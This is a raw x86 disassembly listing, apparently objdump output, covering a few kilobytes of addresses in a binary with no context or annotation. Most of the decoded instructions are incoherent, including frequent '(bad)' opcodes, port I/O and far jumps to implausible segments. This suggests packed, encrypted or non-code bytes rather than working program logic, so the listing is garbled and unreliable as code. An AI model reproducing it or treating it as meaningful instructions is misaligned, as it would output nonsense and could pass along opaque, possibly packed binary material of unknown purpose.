  40a663:	fld    DWORD PTR [eax]
  40a665:	and    eax,DWORD PTR [esi+0x61e94bab]
  40a66b:	fld    DWORD PTR [eax]
  40a66d:	in     al,dx
  40a66e:	jo     0x40a657
  40a670:	or     dh,cl
  40a672:	pop    eax
  40a673:	in     eax,dx
  40a674:	sbb    ebx,ebp
  40a676:	cmc    
  40a677:	in     eax,dx
  40a678:	add    bl,dh
  40a67a:	xor    ch,ah
  40a67c:	push   ds
  40a67d:	loop   0x40a669
  40a67f:	jmp    0xdd21:0xd08bcf00
  40a686:	arpl   dx,ax
  40a688:	xor    BYTE PTR [eax],dl
  40a68a:	ja     0x40a64e
  40a68c:	sub    DWORD PTR [eax],ecx
  40a68e:	pop    eax
  40a68f:	retf   0x1933
  40a692:	xchg   ch,al
  40a694:	jae    0x40a67f
  40a696:	popa   
  40a697:	fld    DWORD PTR [eax]
  40a699:	frstor [edx-0x20]
  40a69c:	(bad)  
  40a69d:	call   0xc6ab1ef9
  40a6a2:	cdq    
  40a6a3:	jmp    0xca26:0xe13be701
  40a6aa:	inc    esi
  40a6ab:	(bad)  
  40a6ac:	cmp    ecx,eax
  40a6ae:	data16 mov bh,0x0
  40a6b1:	les    esi,FWORD PTR [eax]
  40a6b3:	shl    BYTE PTR [edi],1
  40a6b5:	rol    DWORD PTR [eax],1
  40a6b7:	dec    edi
  40a6b8:	fld    DWORD PTR [eax]
  40a6ba:	inc    ecx
  40a6bb:	(bad)  
  40a6bc:	xor    al,0xac
  40a6be:	dec    ebp
  40a6bf:	mov    ebx,0xfd2ac71c
  40a6c4:	dec    ebx
  40a6c5:	scas   al,BYTE PTR es:[edi]
  40a6c6:	inc    ebx
  40a6c7:	pop    ss
  40a6c8:	cmp    al,0x8c
  40a6ca:	jo     0x40a6ad
  40a6cc:	push   esi
  40a6cd:	cwde   
  40a6ce:	jp     0x40a69c
  40a6d0:	xor    eax,0x5cb8758f
  40a6d5:	xchg   edx,eax
  40a6d6:	push   0x5e
  40a6d8:	fld    DWORD PTR [eax]
  40a6da:	add    BYTE PTR [esi],dh
  40a6dc:	pop    es
  40a6dd:	push   cs
  40a6de:	sbb    BYTE PTR [edx-0x14],al
  40a6e1:	js     0x40a756
  40a6e3:	pop    ebp
  40a6e4:	push   cs
  40a6e5:	add    al,0x1a
  40a6e7:	and    al,0xb0
  40a6e9:	(bad)  
  40a6eb:	add    DWORD PTR [ebx-0x16d7c2e3],esi
  40a6f1:	daa    
  40a6f2:	cmp    ebp,DWORD PTR [eax]
  40a6f4:	add    al,0x34
  40a6f6:	sub    bl,BYTE PTR ds:0xfb3521e3
  40a6fc:	fadd   QWORD PTR [eax]
  40a6fe:	add    bl,bh
  40a700:	fadd   QWORD PTR [eax]
  40a702:	add    BYTE PTR [eax-0xb4347ce],dl
  40a708:	push   ds
  40a709:	cwde   
  40a70a:	sahf   
  40a70b:	push   ecx
  40a70c:	add    DWORD PTR [ecx-0x4e902b40],0xffffffb4
  40a713:	jg     0x40a72d
  40a715:	xlat   BYTE PTR ds:[ebx]
  40a716:	leave  
  40a717:	sbb    DWORD PTR [ecx],esp
  40a719:	mov    ch,0x93
  40a71b:	add    BYTE PTR [ebx],bh
  40a71d:	push   ebx
  40a71e:	retf   
  40a71f:	ror    BYTE PTR [eax],1
  40a721:	nop
  40a722:	xchg   edx,eax
  40a723:	xchg   ebp,eax
  40a724:	adc    eax,0x3ec5bd33
  40a729:	ins    BYTE PTR es:[edi],dx
  40a72a:	lods   al,BYTE PTR ds:[esi]
  40a72b:	scas   eax,DWORD PTR es:[edi]
  40a72c:	sbb    eax,0xf9edb56f
  40a731:	xor    al,0xa4
  40a733:	stos   DWORD PTR es:[edi],eax
  40a734:	adc    al,0x70
  40a736:	mov    bh,0xbf
  40a738:	pop    esi
  40a739:	push   eax
  40a73a:	xlat   BYTE PTR ds:[ebx]
  40a73b:	lahf   
  40a73c:	daa    
  40a73d:	cmp    DWORD PTR [edi-0x45c0d04b],edi
  40a743:	mov    ebx,0x8d888d8e
  40a748:	addr16 inc eax
  40a74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74b:	out    dx,eax
  40a74c:	pop    ss
  40a74d:	sbb    ch,dl
  40a74f:	lds    edx,FWORD PTR [edx]
  40a751:	dec    esi
  40a752:	xchg   al,ch
  40a754:	bound  edx,QWORD PTR [eax-0x4a]
  40a757:	frstor [esi]
  40a759:	dec    edi
  40a75a:	xchg   BYTE PTR [ebx+ecx*8+0x3abaa337],bl
  40a761:	jl     0x40a745
  40a763:	lock in al,dx
  40a765:	pop    edx
  40a766:	mov    bl,0xfb
  40a768:	fistp  QWORD PTR [esi+eax*4-0x7a]
  40a76c:	bound  esp,QWORD PTR [eax]
  40a76e:	mov    dl,0xcf
  40a770:	pop    ss
  40a771:	inc    esi
  40a772:	add    al,BYTE PTR [eax]
  40a774:	bound  edx,QWORD PTR [eax+0x35dc9174]
  40a77a:	jne    0x40a71a
  40a77c:	leave  
  40a77d:	mov    bh,BYTE PTR [edi+edi*8+0x0]
  40a781:	in     eax,0x9a
  40a783:	lahf   
  40a784:	neg    bh
  40a786:	xchg   ebp,ebp
  40a788:	xchg   esi,eax
  40a789:	push   ss
  40a78a:	iret   
  40a78b:	loope  0x40a783
  40a78d:	mov    ebx,0x12b47d94
  40a792:	mov    eax,ds:0x74b8f6d1
  40a797:	scas   eax,DWORD PTR es:[edi]
  40a798:	test   al,0xc0
  40a79a:	lahf   
  40a79b:	out    dx,al
  40a79c:	mov    al,BYTE PTR [edx]
  40a79e:	push   ebx
  40a79f:	(bad)  
  40a7a0:	loop   0x40a749
  40a7a2:	cmp    BYTE PTR [ebx-0x64],0xa0
  40a7a6:	mov    ah,0xc1
  40a7a8:	mov    dh,0xf6
  40a7aa:	scas   al,BYTE PTR es:[edi]
  40a7ab:	int    0xc2
  40a7ad:	pushf  
  40a7ae:	jl     0x40a827
  40a7b0:	nop
  40a7b1:	test   eax,0xeaa2cdb5
  40a7b6:	jp     0x40a76d
  40a7b8:	ret    0x98a2
  40a7bb:	add    DWORD PTR [eax],eax
  40a7bd:	bound  esp,QWORD PTR [edi]
  40a7bf:	sub    al,0x20
  40a7c1:	xor    DWORD PTR [edi+0x22],ecx
  40a7c4:	xor    BYTE PTR [eax+eiz*1+0x4a862702],al
  40a7cb:	sub    BYTE PTR [ecx],bh
  40a7cd:	xchg   cl,bl
  40a7cf:	sbb    DWORD PTR [ebx],esp
  40a7d1:	pop    eax
  40a7d2:	fldenv [eax]
  40a7d4:	and    DWORD PTR [ebp+eax*8+0x2],esi
  40a7d8:	xor    ah,BYTE PTR [eax-0x1b]
  40a7db:	cld    
  40a7dc:	sub    al,0x7a
  40a7de:	(bad)  
  40a7df:	icebp  
  40a7e0:	repnz push ebp
  40a7e2:	fcmovnu st,st(1)
  40a7e4:	cmc    
  40a7e5:	add    BYTE PTR [eax-0x2b],ch
  40a7e8:	jmp    0xe623fdff
  40a7ed:	add    esp,DWORD PTR [edx-0x27]
  40a7f0:	push   cs
  40a7f1:	push   edi
  40a7f2:	jbe    0x40a7ab
  40a7f4:	or     DWORD PTR [edx-0x7e],esp
  40a7f7:	fnstcw WORD PTR [esi-0x7b]
  40a7fa:	rcl    DWORD PTR [edx+0x5f],cl
  40a7fd:	mov    edx,edi
  40a7ff:	imul   ebp,DWORD PTR [ebp-0x17ab2d6f],0x59d96203
  40a809:	mov    ch,ah
  40a80b:	push   edi
  40a80c:	addr16 (bad) 
  40a80e:	in     al,0x16
  40a810:	jae    0x40a88b
  40a812:	fcmovu st,st(1)
  40a814:	mov    bh,0x36
  40a816:	and    al,0x93
  40a818:	mov    esi,0xa1d71a47
  40a81d:	cmp    DWORD PTR [edx],ebx
  40a81f:	fldenv [ebp+ecx*4-0x35]
  40a823:	imul   edx,DWORD PTR [ebp+0x77],0x766665b7
  40a82a:	xchg   ebp,eax
  40a82b:	push   es
  40a82c:	(bad)  
  40a82d:	dec    ebx
  40a82e:	sub    eax,0x2942ac94
  40a833:	frstor [edi-0x2926dfc1]
  40a839:	and    al,0x4a
  40a83b:	int3   
  40a83c:	fsubr  DWORD PTR [esi]
  40a83e:	sub    esi,DWORD PTR [esi-0x32c5e67d]
  40a844:	out    0x3,eax
  40a846:	(bad)  
  40a847:	fld    DWORD PTR [eax]
  40a849:	jge    0x40a84b
  40a84b:	enter  0x707a,0x75
  40a84f:	(bad)  
  40a850:	mov    ah,BYTE PTR [ebx+0x5a]
  40a853:	mov    edi,0xa5404d9d
  40a858:	mov    ds:0x709c3845,eax
  40a85d:	popa   
  40a85e:	xor    esp,DWORD PTR [edx-0x6acea254]
  40a864:	in     al,0x72
  40a866:	dec    esi
  40a867:	mov    BYTE PTR [ebx+0x79ba3c4b],al
  40a86d:	push   0x36
  40a86f:	dec    edx
  40a870:	jge    0x40a8e4
  40a872:	and    eax,0xe9627b7b
  40a877:	popa   
  40a878:	fld    DWORD PTR [eax]
  40a87a:	shl    BYTE PTR [edx-0x28],1
  40a87d:	add    eax,0x31dfe8f4
  40a882:	loopne 0x40a8d8
  40a884:	out    0x0,al
  40a886:	mov    fs,WORD PTR [esi-0x4d6d3fed]
  40a88c:	sbb    ch,bh
  40a88e:	cwde   
  40a88f:	pushf  
  40a890:	sbb    al,0xd4
  40a892:	sub    eax,0xe9c0f20f
  40a897:	popa   
  40a898:	fld    DWORD PTR [eax]
  40a89a:	add    edx,0xd190aa15
  40a8a0:	sub    ch,BYTE PTR [esi+0x126c57c]
  40a8a6:	inc    edi
  40a8a7:	or     DWORD PTR [ebx],0xfad741e3
  40a8ad:	repz xor eax,DWORD PTR [eax]
  40a8b0:	jnp    0x40a8bf
  40a8b2:	add    DWORD PTR [ebx-0x72958907],ebx
  40a8b8:	adc    al,0x76
  40a8ba:	add    al,dl
  40a8bc:	pop    ebp
  40a8bd:	xlat   BYTE PTR ds:[ebx]
  40a8be:	sbb    esi,eax
  40a8c0:	push   ebx
  40a8c1:	out    0x8,eax
  40a8c3:	add    BYTE PTR [ebp+0x370207c7],bl
  40a8c9:	rcl    DWORD PTR ds:0xea2f0a,1
  40a8cf:	add    BYTE PTR ds:0x35021106,ah
  40a8d5:	push   cs
  40a8d6:	add    DWORD PTR [edi],edx
  40a8d8:	push   0xffffffba
  40a8da:	or     eax,0xf064e0e
  40a8df:	sbb    esp,DWORD PTR [edx-0x30]
  40a8e2:	adc    BYTE PTR [edx],bh
  40a8e4:	sub    esp,edx
  40a8e6:	add    edx,DWORD PTR [esi]
  40a8e8:	add    edx,ebp
  40a8ea:	sbb    ecx,DWORD PTR [ebx]
  40a8ec:	push   ss
  40a8ed:	mov    dl,0x2
  40a8ef:	or     DWORD PTR [eax+eiz*8+0x24],esp
  40a8f3:	cmp    DWORD PTR [edi*4+0x4aac0000],esp
  40a8fa:	test   eax,0xed619fba
  40a8ff:	in     eax,dx
  40a900:	frstor [edx-0x44]
  40a903:	mov    edi,0xd8fb
  40a908:	jl     0x40a8a4
  40a90a:	push   edi
  40a90b:	dec    esi
  40a90c:	imul   esp,DWORD PTR [ebp+0x78c96a61],0x4006676
  40a916:	jns    0x40a98b
  40a918:	je     0x40a8b4
  40a91a:	scas   al,BYTE PTR es:[edi]
  40a91b:	je     0x40a985
  40a91d:	add    cl,bl
  40a91f:	add    BYTE PTR [eax],al
  40a921:	(bad)  
  40a922:	fild   DWORD PTR [ecx]
  40a924:	pop    ss
  40a925:	push   edi
  40a926:	out    0x2f,eax
  40a928:	sbb    BYTE PTR [esi+ebp*8-0x229bd4cb],bl
  40a92f:	add    BYTE PTR [eax],al
  40a931:	mov    eax,ebp
  40a933:	xor    al,0x37
  40a935:	xchg   ecx,edx
  40a937:	bndstx [ebx+0x621c0803],bnd0
  40a93e:	sub    eax,0x75d0007
  40a943:	add    al,BYTE PTR [eax]
  40a945:	(bad)  
  40a946:	xlat   BYTE PTR ds:[ebx]
  40a947:	loopne 0x40a931
  40a949:	pop    ebp
  40a94a:	shl    edi,cl
  40a94c:	std    
  40a94d:	std    
  40a94e:	iret   
  40a94f:	jmp    0x479f0c3b
  40a954:	push   ebp
  40a955:	mov    esi,0x934444b0
  40a95a:	mov    ebx,0xb8997c3e
  40a95f:	inc    eax
  40a960:	jge    0x40a8ee
  40a962:	mov    dh,0x38
  40a964:	pop    eax
  40a965:	xchg   al,ah
  40a967:	push   edx
  40a968:	pop    esp
  40a969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a96a:	in     al,0x3b
  40a96c:	dec    ebp
  40a96d:	lods   eax,DWORD PTR ds:[esi]
  40a96e:	mov    ebp,0xb7626a45
  40a973:	xor    al,0x43
  40a975:	cwde   
  40a976:	int    0xe
  40a978:	inc    edi
  40a979:	add    BYTE PTR [ecx+esi*4-0x549dfffc],ch
  40a980:	test   DWORD PTR [edi-0x7d877e1e],ebp
  40a986:	shr    DWORD PTR [ebp-0x6b156276],1
  40a98c:	mov    ecx,DWORD PTR [edi-0x708d8a09]
  40a992:	(bad)  
  40a993:	std    
  40a994:	sbb    ecx,DWORD PTR [edx]
  40a996:	mov    al,ch
  40a998:	sub    eax,0x280b8b39
  40a99d:	xor    edi,DWORD PTR [edi-0x2c]
  40a9a0:	and    al,BYTE PTR [eax]
  40a9a2:	bound  edx,QWORD PTR [eax-0x4d432238]
  40a9a8:	mov    cl,0xc3
  40a9aa:	and    ecx,0xe9b8deca
  40a9b0:	jmp    0x40a97b
  40a9b2:	lods   al,BYTE PTR ds:[esi]
  40a9b3:	fistp  QWORD PTR [eax+0x69d885ff]
  40a9b9:	sbb    ah,0x6b
  40a9bc:	je     0x40a94e
  40a9be:	mov    eax,ds:0xd47f3f1c
  40a9c3:	push   0xffffffe8
  40a9c5:	add    esp,DWORD PTR [edx-0x27]
  40a9c8:	jnp    0x40aa22
  40a9ca:	retf   
  40a9cb:	jle    0x40a965
  40a9cd:	inc    esi
  40a9ce:	mov    ds:0x6203e79d,al
  40a9d3:	fnstcw WORD PTR [ebx+0x70]
  40a9d6:	shl    DWORD PTR [esi+0x33],cl
  40a9d9:	dec    esp
  40a9da:	xchg   edx,eax
  40a9db:	xchg   ebp,eax
  40a9dc:	cmp    DWORD PTR [eax+eax*1],eax
  40a9df:	(bad)  
  40a9e0:	fnstenv [eax+eax*8-0x1142d813]
  40a9e7:	sub    DWORD PTR [eax+ecx*8],ebp
  40a9ea:	loope  0x40aa09
  40a9ec:	add    esi,DWORD PTR [esi]
  40a9ee:	outs   dx,BYTE PTR ds:[esi]
  40a9ef:	xchg   edx,eax
  40a9f0:	fnstenv [edx-0x52e0cf49]
  40a9f6:	mov    edi,0xbfaf211d
  40a9fb:	and    al,0x18
  40a9fd:	sar    BYTE PTR [ebp+0x41ada16],0x7a
  40aa04:	fld    DWORD PTR [esp+eax*1]
  40aa07:	jbe    0x40a9e2
  40aa09:	adc    eax,DWORD PTR [ecx+edx*4]
  40aa0c:	fnstcw WORD PTR [ecx+0xbd98403]
  40aa12:	add    al,0x3e
  40aa14:	fsincos 
  40aa16:	add    esp,DWORD PTR [edx-0x27]
  40aa19:	mov    edx,0xd37c254b
  40aa1e:	dec    eax
  40aa1f:	inc    esp
  40aa20:	jb     0x40aa00
  40aa22:	ins    DWORD PTR es:[edi],dx
  40aa23:	and    al,0x72
  40aa25:	mov    ebx,0x97873f67
  40aa2a:	bound  edx,QWORD PTR [esi]
  40aa2c:	jno    0x40aa15
  40aa2e:	add    esp,DWORD PTR [edx-0x27]
  40aa31:	add    dh,dh
  40aa33:	push   ebp
  40aa34:	fld    DWORD PTR [eax]
  40aa36:	out    dx,al
  40aa37:	inc    ebp
  40aa38:	xchg   esi,eax
  40aa39:	add    dh,ah
  40aa3b:	sub    cl,bl
  40aa3d:	add    BYTE PTR [edx-0x74ff879f],cl
  40aa43:	add    BYTE PTR [ecx+0x70],ah
  40aa46:	add    BYTE PTR [edi+0x61],bh
  40aa49:	jl     0x40aa4b
  40aa4b:	jge    0x40aaae
  40aa4d:	mov    bl,0x0
  40aa4f:	test   DWORD PTR [ecx+0x75],esp
  40aa52:	add    BYTE PTR [ebp-0x58ff269f],al
  40aa58:	mov    ds:0xc55b4190,al
  40aa5d:	js     0x40aad3
  40aa5f:	inc    esp
  40aa60:	pop    esi
  40aa61:	fld    DWORD PTR [eax]
  40aa63:	das    
  40aa64:	mov    ds:0xba453f90,eax
  40aa69:	fwait
  40aa6a:	addr16 push ebp
  40aa6c:	test   ecx,ebx
  40aa6e:	add    BYTE PTR [edi],ah
  40aa70:	mov    ds:0xb5454690,eax
  40aa75:	xchg   BYTE PTR [eax+0x2a],ch
  40aa78:	xor    DWORD PTR [edi+0x67],0x8d8517
  40aa7f:	daa    
  40aa80:	mov    ds:0x930c4490,eax
  40aa85:	lea    esi,[edx-0x2]
  40aa88:	mov    cl,bl
  40aa8a:	add    BYTE PTR [eax-0x70ff3e10],al
  40aa90:	lock rol DWORD PTR [eax],0x8d
  40aa94:	jmp    0x40aa57
  40aa96:	add    BYTE PTR [esi+0x6000c1ea],bh
  40aa9c:	rol    cl,1
  40aa9e:	add    BYTE PTR [edi-0x30],cl
  40aaa1:	rol    DWORD PTR [eax],0x47
  40aaa4:	rol    cl,1
  40aaa6:	add    BYTE PTR [edx+0x0],bl
  40aaa9:	rol    cl,1
  40aaab:	add    BYTE PTR [eax],al
  40aaad:	mov    bl,0xa9
  40aaaf:	je     0x40ab21
  40aab1:	popa   
  40aab2:	mov    ah,0x2d
  40aab4:	ja     0x40aa82
  40aab6:	lods   al,BYTE PTR ds:[esi]
  40aab7:	les    esi,FWORD PTR cs:[si+0x65]
  40aabc:	ins    BYTE PTR es:[edi],dx
  40aabd:	out    dx,al
  40aabe:	mov    bl,0x61
  40aac0:	outs   dx,DWORD PTR ds:[esi]
  40aac1:	out    0xb4,al
  40aac3:	add    BYTE PTR [eax],al
  40aac5:	jecxz  0x40aa70
  40aac7:	je     0x40ab39
  40aac9:	xchg   ecx,eax
  40aaca:	mov    ah,0x2d
  40aacc:	ja     0x40aaaa
  40aace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aacf:	(bad)
  40aad5:	fsubr  DWORD PTR [ebp+0x6b]
  40aad8:	das    
  40aad9:	cmp    ebx,ebp
  40aadb:	add    BYTE PTR [eax],al
  40aadd:	adc    eax,DWORD PTR [ecx-0x76b4ffc3]
  40aae3:	cmp    eax,0x3e0e1700
  40aae8:	add    BYTE PTR ds:0x70003e0e,dh
  40aaee:	int    0x3f
  40aaf0:	add    al,dh
  40aaf2:	imul   edi,DWORD PTR [esi],0x0
  40aaf5:	and    ch,bl
  40aaf7:	aas    
  40aaf8:	add    BYTE PTR [ecx+0x2f],ch
  40aafb:	add    BYTE PTR ds:[esp+edx*8+0x3f],cl
  40ab00:	add    BYTE PTR [edx-0x2c],dh
  40ab03:	aas    
  40ab04:	add    dh,dl
  40ab06:	sar    DWORD PTR [edi],cl
  40ab08:	add    BYTE PTR [ecx],ch
  40ab0a:	das    
  40ab0b:	add    BYTE PTR ds:[eax],al
  40ab0e:	mov    esp,ss
  40ab10:	aas    
  40ab11:	add    BYTE PTR [edx-0x2c],dl
  40ab14:	aas    
  40ab15:	add    bh,dl
  40ab17:	loopne 0x40ab3d
  40ab19:	and    al,0xb6
  40ab1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1c:	jno    0x40ab92
  40ab1e:	sahf   
  40ab1f:	stos   BYTE PTR es:[edi],al
  40ab20:	jne    0x40ab9a
  40ab22:	ret    0x799e
  40ab25:	and    al,0x62
  40ab27:	into   
  40ab28:	and    BYTE PTR [esi+edi*2],ah
  40ab2b:	(bad)  
  40ab2c:	and    BYTE PTR [esi],bh
  40ab2e:	pop    ebp
  40ab2f:	xor    al,BYTE PTR [ebp+0x42]
  40ab32:	and    DWORD PTR [esi],esi
  40ab34:	inc    ecx
  40ab35:	inc    esi
  40ab36:	and    eax,0x194a4d3a
  40ab3b:	pop    esi
  40ab3c:	dec    ecx
  40ab3d:	dec    esi
  40ab3e:	sub    eax,0x11523542
  40ab43:	inc    esi
  40ab44:	xor    DWORD PTR [esi+0x15],edx
  40ab47:	push   cs
  40ab48:	push   ds
  40ab49:	and    al,0x3e
  40ab4b:	push   ss
  40ab4c:	push   ds
  40ab4d:	pop    eax
  40ab4e:	mov    ebx,0xb75c3f3c
  40ab53:	pusha  
  40ab54:	cmp    esp,DWORD PTR [eax-0x3d]
  40ab57:	push   esp
  40ab58:	addr16 fs mov edi,0xcb686358
  40ab5f:	lods   al,BYTE PTR ds:[esi]
  40ab60:	ins    DWORD PTR es:[edi],dx
  40ab61:	ins    BYTE PTR es:[edi],dx
  40ab62:	(bad)  
  40ab63:	nop
  40ab64:	imul   esi,DWORD PTR [eax-0x4d],0x620001f2
  40ab6b:	repnz add DWORD PTR [eax],eax
  40ab6e:	bound  esi,QWORD PTR [ecx-0x61ffbcba]
  40ab74:	mov    ch,0x42
  40ab76:	inc    edi
  40ab77:	call   0x4add:0x964b4eb9
  40ab7e:	dec    edi
  40ab7f:	xchg   edx,eax
  40ab80:	shl    DWORD PTR [esi],0x53
  40ab83:	mov    es,ebp
  40ab85:	xor    dl,BYTE PTR [edi-0x76]
  40ab88:	leave  
  40ab89:	ds popa 
  40ab8b:	adc    bl,0x60
  40ab8e:	gs inc esp
  40ab90:	iret   
  40ab91:	ins    BYTE PTR es:[edi],dx
  40ab92:	imul   ecx,DWORD PTR [eax-0x15],0xd73c6d68
  40ab99:	push   esp
  40ab9a:	jno    0x40abec
  40ab9c:	add    ecx,DWORD PTR [esi+0x75]
  40ab9f:	xor    al,0xd9
  40aba1:	ficomp WORD PTR [ebx+0x3b]
  40aba4:	adc    DWORD PTR [edi],0x15
  40aba7:	jo     0x40ab75
  40aba9:	sbb    edx,DWORD PTR [ecx]
  40abab:	ins    BYTE PTR es:[edi],dx
  40abac:	enter  0x1d0f,0x49
  40abb0:	mov    al,0xe7
  40abb2:	add    esp,DWORD PTR [edx-0x27]
  40abb5:	call   0x3103:0xbad90b03
  40abbc:	fnstcw WORD PTR [edi-0x7426fcfd]
  40abc2:	add    eax,DWORD PTR ds:0x620396d9
  40abc8:	fxch   st(2)
  40abca:	add    esi,DWORD PTR [ecx]
  40abcc:	(bad)  
  40abce:	add    edx,DWORD PTR [ebp-0x65fc4227]
  40abd4:	(bad)  
  40abd6:	add    eax,DWORD PTR [eax]
  40abd8:	(bad)  
  40abd9:	fldcw  WORD PTR [edx+0x7dd9b503]
  40abdf:	add    esi,DWORD PTR [ecx-0x39fba927]
  40abe5:	fld    DWORD PTR [esp+eax*1-0x6b]
  40abe9:	fld    DWORD PTR [eax+0x4]
  40abec:	mov    ah,0xd9
  40abee:	inc    ebx
  40abef:	add    al,0x8d
  40abf1:	fnstcw WORD PTR [esi]
  40abf3:	add    al,0xa1
  40abf5:	(bad)  [ebx+0x4]
  40abf8:	sbb    ecx,0x3a
  40abfb:	add    al,0x91
  40abfd:	(bad)  
  40abff:	add    esp,DWORD PTR [edx-0x27]
  40ac02:	sub    al,BYTE PTR [ebx+ecx*4]
  40ac05:	(bad)  [edx]
  40ac07:	add    al,0x87
  40ac09:	fstp   DWORD PTR [ecx]
  40ac0b:	add    al,0x75
  40ac0d:	fnstenv [esp+eax*1]
  40ac10:	sub    ebx,ecx
  40ac12:	push   ds
  40ac13:	add    al,0x44
  40ac15:	fld    DWORD PTR [ebx]
  40ac17:	add    al,0x24
  40ac19:	fld    DWORD PTR [eax]
  40ac1b:	sti    
  40ac1c:	popa   
  40ac1d:	js     0x40ac1f
  40ac1f:	cld    
  40ac20:	popa   
  40ac21:	je     0x40ac23
  40ac23:	jmp    0xac418589
  40ac28:	popa   
  40ac29:	xchg   ebp,eax
  40ac2a:	add    BYTE PTR [eax-0x42ff659f],ah
  40ac30:	popa   
  40ac31:	jo     0x40ac33
  40ac33:	int3   
  40ac34:	popa   
  40ac35:	outs   dx,DWORD PTR ds:[esi]
  40ac36:	add    BYTE PTR [ebp-0x65ff269f],dh
  40ac3c:	add    BYTE PTR [ecx-0x80],ah
  40ac3f:	add    BYTE PTR [edx-0x6fff729f],bh
  40ac45:	popa   
  40ac46:	mov    al,BYTE PTR [eax]
  40ac48:	xchg   ebp,eax
  40ac49:	popa   
  40ac4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac4b:	add    BYTE PTR [eax-0x69ff8b9f],al
  40ac51:	popa   
  40ac52:	retf   0xbb00
  40ac55:	popa   
  40ac56:	fld    DWORD PTR [eax]
  40ac58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac59:	cwde   
  40ac5a:	mov    eax,ds:0xd961ac4b
  40ac5f:	add    BYTE PTR [ebp+0x61],dh
  40ac62:	ins    BYTE PTR es:[edi],dx
  40ac63:	add    BYTE PTR [ecx+0x5e],bl
  40ac66:	fld    DWORD PTR [eax]
  40ac68:	add    al,0x66
  40ac6a:	mov    al,BYTE PTR [eax]
  40ac6c:	or     al,0x5e
  40ac6e:	leave  
  40ac6f:	add    BYTE PTR [ecx],dl
  40ac71:	add    WORD PTR [eax],0x5e17
  40ac76:	mov    ah,0x0
  40ac78:	cmp    ah,BYTE PTR [esi-0x27]
  40ac7b:	add    BYTE PTR [esi+ebx*2],cl
  40ac7e:	mov    al,BYTE PTR [eax]
  40ac80:	add    al,0x66
  40ac82:	leave  
  40ac83:	add    cl,ah
  40ac85:	popa   
  40ac86:	add    DWORD PTR [eax],0xd961e9
  40ac8c:	ret    
  40ac8d:	popa   
  40ac8e:	fld    DWORD PTR [eax]
  40ac90:	mov    esp,0xd961
  40ac95:	mov    cl,0xb0
  40ac97:	sub    al,BYTE PTR [eax]
  40ac99:	imul   edx,DWORD PTR [eax-0x2644abaf],0x0
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	test   BYTE PTR [esi-0x520cffac],bh
  40aca8:	push   esp
  40aca9:	push   eax
  40acaa:	pop    esp
  40acab:	jmp    0x0:0xd9bb312e
  40acb2:	retf   0x6174
  40acb5:	fisttp DWORD PTR gs:[ebp+0x6f9a4c2b]
  40acbc:	gs jne 0x40ac59
  40acbf:	js     0x40ad24
  40acc1:	cmp    ch,BYTE PTR [ebx-0x2b]
  40acc4:	add    BYTE PTR [eax],al
  40acc6:	outs   dx,BYTE PTR ds:[esi]
  40acc7:	retf   
  40acc8:	add    BYTE PTR [eax],al
  40acca:	mov    eax,0xd66e6e70
  40accf:	je     0x40ad45
  40acd1:	imul   ebx,esp,0x8203a72
  40acd7:	jne    0x40ad46
  40acd9:	jae    0x40acc1
  40acdb:	ror    DWORD PTR [edx],cl
  40acdd:	add    dh,al
  40acdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ace0:	ins    BYTE PTR es:[edi],dx
  40ace1:	ins    DWORD PTR es:[edi],dx
  40ace2:	mov    esp,0x8f642e72
  40ace7:	jno    0x40ace9
  40ace9:	add    BYTE PTR [edi+esi*2+0x74],bh
  40aced:	popa   
  40acee:	mov    ds:0xa6735373,al
  40acf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf4:	aas    
  40acf5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40acf7:	jae    0x40ad6d
  40acf9:	push   ebx
  40acfa:	push   edi
  40acfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acfc:	outs   dx,BYTE PTR ds:[si]
  40acfe:	xchg   esp,eax
  40acff:	aad    0x0
  40ad01:	add    BYTE PTR [ecx],al
  40ad03:	fld    DWORD PTR [eax]
  40ad05:	add    BYTE PTR [eax],al
  40ad07:	or     ebx,ecx
  40ad09:	add    BYTE PTR [eax],al
  40ad0b:	scas   al,BYTE PTR es:[edi]
  40ad0c:	loope  0x40ac91
  40ad0e:	std    
  40ad0f:	bound  ebp,QWORD PTR [ebp+edx*2-0x30]
  40ad13:	jae    0x40ad85
  40ad15:	xor    al,BYTE PTR [eax]
  40ad17:	mov    ds:0x1659bcc3,al
  40ad1c:	test   eax,0x85bd0b72
  40ad21:	dec    ecx
  40ad22:	rcl    DWORD PTR [ebx+0x78],1
  40ad25:	outs   dx,DWORD PTR ds:[esi]
  40ad26:	push   ebp
  40ad28:	inc    ebx
  40ad29:	popf   
  40ad2a:	push   eax
  40ad2b:	mov    cl,0xc5
  40ad2d:	sbb    BYTE PTR [ebp-0x2faa9359],al
  40ad33:	jae    0x40ada5
  40ad35:	xor    al,BYTE PTR [eax]
  40ad37:	mov    ds:0xd659ba43,al
  40ad3c:	cdq    
  40ad3d:	xchg   ebx,eax
  40ad3e:	aas    
  40ad3f:	bound  edx,QWORD PTR [ebx+edx*4+0x49f7623f]
  40ad46:	inc    ecx
  40ad47:	bound  esp,QWORD PTR [ebx]
  40ad49:	fwait
  40ad4a:	aas    
  40ad4b:	bound  esi,QWORD PTR [ecx+0x30]
  40ad4e:	inc    esi
  40ad4f:	outs   dx,BYTE PTR ds:[si]
  40ad51:	icebp  
  40ad52:	iret   
  40ad53:	jae    0x40acec
  40ad55:	xchg   edi,eax
  40ad56:	push   DWORD PTR [ebp-0x5d]
  40ad59:	mov    ch,0xd0
  40ad5b:	pop    eax
  40ad5c:	rol    DWORD PTR [eax],1
  40ad5e:	dec    ebx
  40ad5f:	xlat   BYTE PTR ds:[ebx]
  40ad60:	inc    eax
  40ad61:	repz iret 
  40ad63:	push   ebx
  40ad64:	jno    0x40ad02
  40ad66:	push   ebp
  40ad68:	ret    0x59bc
  40ad6b:	add    dh,dh
  40ad6d:	push   0x253d0b70
  40ad72:	dec    ebx
  40ad73:	shl    DWORD PTR [ebx+0x78],1
  40ad76:	jo     0x40ad77
  40ad78:	aad    0xc2
  40ad7a:	fwait
